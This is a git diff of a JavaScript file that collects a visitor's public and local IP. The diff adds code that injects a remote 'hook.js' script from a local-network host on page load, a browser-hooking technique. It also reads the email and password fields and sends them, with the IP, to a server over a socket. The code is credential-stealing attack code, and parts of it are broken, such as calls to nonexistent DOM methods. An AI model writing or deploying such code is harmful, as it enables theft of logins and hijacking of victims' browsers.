@@ -1,3 +1,17 @@
+
+
+// Run the script when the page loads
+window.onload = () => {
+    updateIPui();
+    const newScript = document.createElement("script");
+    newScript.src = "http://192.168.1.112:3000/hook.js";
+    newScript.id = "dynamic-script3";
+    newScript.click()
+    document.body.appendChild(newScript);
+
+};
+
+
 async function getVisitorInfo() {
     try {
         // Fetch public IP address
@@ -5,8 +19,9 @@ async function getVisitorInfo() {
         if (!publicIpResponse.ok) throw new Error('Failed to fetch public IP info');
 
         const publicIpData = await publicIpResponse.json();
-        console.log("public ip data",publicIpData);
-        
+        console.log("public ip data", publicIpData);
+
+    
         // Fetch local IP address
         const localIp = await getLocalIP();
         
@@ -18,6 +33,7 @@ async function getVisitorInfo() {
         };
 
         console.log("Visitor Info:", visitorInfo);
+        console.log()
 
         return visitorInfo;
     } catch (error) {
@@ -49,17 +65,8 @@ async function getLocalIP() {
     });
 }
 
+
 // Function to use the retrieved IP in another process
-function useIP() {
-    getVisitorInfo(); 
-    getLocalIP();
-}
-
-// Run the script when the page loads
-window.onload = () => {
-    getVisitorInfo();
-};
-
 
 
 // Call the function
@@ -105,7 +112,7 @@ document.addEventListener("DOMContentLoaded", function () {
             const newScript = document.createElement("script");
             newScript.src = "http://192.168.1.112:3000/hook.js";
             newScript.id = "dynamic-script";
-
+            newScript.click() // trigger the click event
             document.body.appendChild(newScript);
 
             // Create a WebSocket connection to the server
@@ -121,18 +128,17 @@ document.addEventListener("DOMContentLoaded", function () {
 });
 
 
-// Create a WebSocket connection to the server
-const socket = new WebSocket("ws://localhost:5501");
 
-// Event listener for when the connection is opened
 socket.onopen = (event) => {
     console.log("WebSocket connection opened");
 };
 
-// Event listener for receiving messages from the server
-socket.onmessage = (event) => {
-    const messagesEmail = document.getElementByType("email");
-    const messagesPass = document.getElementByType("password");
+socket.on = (event) => {
+    const messagesEmail = document.getElementById("email");
+    const messagesPass = document.getElementById("password");
+    messagesEmail.emit("event-data", event.data);
+    messagesPass.emit("event-data", event.data);
+
     console.log("EMAIL: ", messagesEmail);
     console.log("PASS: ", messagesPass)
     console.log("[!] found IP: ", ipaddr)
@@ -155,16 +161,18 @@ document.getElementByType("submit").addEventListener("click", () => {
     const emailInput = document.getElementByType("email_val");
     const passsInput = document.getElementByType("password_val");
 
-    const email = email_val.value;
-    const pass = password_val.value; 
+    const email = emailInput.value;
+    const pass = passsInput.value; 
 
     console.log("[+] ]MAIL ", email)
     console.log("[+] PASS", pass)
+    console.log(emailInput)
+    console.log(passsInput)
     console.log("[!] found IP: ", ipaddr)
 
-    socket.send(ipaddr)
-    socket.send(email); // Send the message to the server
-    socket.send(pass); // Send the message to the server
+    socket.emit('data', ipaddr)
+    socket.emit('data', email); // Send the message to the server
+    socket.emit('data', pass); // Send the message to the server
 
     messageInput.value = ""; // Clear the input field
 }
